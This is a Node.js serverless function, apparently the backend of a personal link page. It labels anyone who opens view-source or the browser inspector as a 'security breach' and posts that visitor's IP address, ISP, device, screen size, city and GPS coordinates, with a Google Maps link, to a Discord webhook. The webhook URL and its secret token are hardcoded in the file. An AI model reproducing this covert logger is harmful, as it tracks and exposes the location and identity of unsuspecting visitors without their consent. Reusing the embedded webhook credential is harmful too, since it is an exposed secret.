const https = require('https');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    try {
        const payload = req.body || {};
        const geo = payload.geo || {};
        const loc = [geo.city, geo.region, geo.country].filter(Boolean).join(', ') || 'Indonesia, Jakarta Barat';
        const coords = (geo.latitude && geo.longitude) ? `${geo.latitude}, ${geo.longitude}` : 'Tidak diketahui';
        const mapsUrl = (geo.latitude && geo.longitude) ? `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}` : '';
        const ip = geo.ip || req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
        const isp = (geo.connection && (geo.connection.isp || geo.connection.org)) || 'Tidak diketahui';
        const action = payload.trigger || 'Akses Inspeksi / View Source Terdeteksi';
        const device = payload.device || 'Perangkat tidak diketahui';
        const screen = payload.screen || 'Resolusi tidak diketahui';
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';

        const webhookURL = process.env.DISCORD_WEBHOOK_URL || 
            "https://discord.com/api/webhooks/1571181962733817887/mHwQXZwWpJAQ8Tk6b94-Ax-5707CdHVvkYZT-p5Q4FwvKvIVop5J_dmv2klpWd7DWbWU";

        const embedPayload = JSON.stringify({
            username: 'Soradesu Cyber Defense',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
            embeds: [{
                title: '🚨 SECURITY BREACH DETECTED!',
                description: 'Seseorang tertangkap basah mencoba melihat source code / melakukan inspeksi di biolink!',
                color: 0xEF4444,
                fields: [
                    { name: '⚡ AKSI PELANGGARAN', value: `\`${action}\``, inline: false },
                    { name: '📍 LOKASI FISIK TARGET', value: `**${loc}**\n**Koordinat:** \`${coords}\`${mapsUrl ? ` • [Buka di Google Maps](${mapsUrl})` : ''}`, inline: false },
                    { name: '📡 IP ADDRESS', value: `\`${ip}\``, inline: true },
                    { name: '🏢 ISP / PROVIDER', value: `\`${isp}\``, inline: true },
                    { name: '💻 PERANGKAT & OS', value: `\`${device}\``, inline: true },
                    { name: '🖥️ RESOLUSI LAYAR', value: `\`${screen}\``, inline: true },
                    { name: '⏰ WAKTU KEJADIAN', value: `\`${timestamp}\``, inline: false }
                ],
                footer: {
                    text: 'Soradesu Defense System • Auto Security Logger'
                },
                timestamp: new Date().toISOString()
            }]
        });

        const targetUrl = new URL(webhookURL);

        await new Promise((resolve, reject) => {
            const discordReq = https.request({
                hostname: targetUrl.hostname,
                path: targetUrl.pathname + targetUrl.search,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(embedPayload)
                }
            }, (hookRes) => {
                resolve(hookRes.statusCode);
            });
            discordReq.on('error', reject);
            discordReq.write(embedPayload);
            discordReq.end();
        });

        res.status(200).json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
